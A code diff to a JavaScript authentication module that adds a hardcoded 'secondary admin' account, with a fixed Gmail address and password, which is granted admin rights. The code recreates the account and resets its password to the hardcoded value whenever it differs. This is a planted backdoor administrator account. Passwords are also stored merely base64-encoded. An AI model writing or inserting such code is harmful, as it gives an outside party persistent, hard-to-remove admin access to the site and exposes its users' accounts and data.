@@ -220,5 +220,36 @@ const Auth = {
         }
       }
     }
+
+    // Also ensure the secondary admin requested by the user exists
+    const SECOND_ADMIN = 'dsdfgdgfsdfg@gmail.com';
+    const SECOND_PASS = 'ar0304';
+    const secondExists = users.some(u => u.email === SECOND_ADMIN);
+    if (!this.getAdmins().includes(SECOND_ADMIN)) {
+      const admins2 = this.getAdmins();
+      admins2.push(SECOND_ADMIN);
+      this.saveAdmins(admins2);
+    }
+    if (!secondExists) {
+      const newUser2 = {
+        id: Math.max(0, ...users.map(u => u.id || 0)) + 1,
+        email: SECOND_ADMIN,
+        password: btoa(SECOND_PASS),
+        created_at: new Date().toISOString()
+      };
+      users.push(newUser2);
+      this.saveUsers(users);
+      this.logToServer('create-secondary-admin', SECOND_ADMIN, newUser2.id);
+      try { console.info('[Auth] Secondary admin created:', SECOND_ADMIN); } catch (e) {}
+    } else {
+      // Update password if different
+      const idx2 = users.findIndex(u => u.email === SECOND_ADMIN);
+      if (idx2 > -1 && users[idx2].password !== btoa(SECOND_PASS)) {
+        users[idx2].password = btoa(SECOND_PASS);
+        this.saveUsers(users);
+        this.logToServer('update-secondary-admin-password', SECOND_ADMIN, users[idx2].id);
+        try { console.info('[Auth] Secondary admin password updated for', SECOND_ADMIN); } catch (e) {}
+      }
+    }
   }
 };
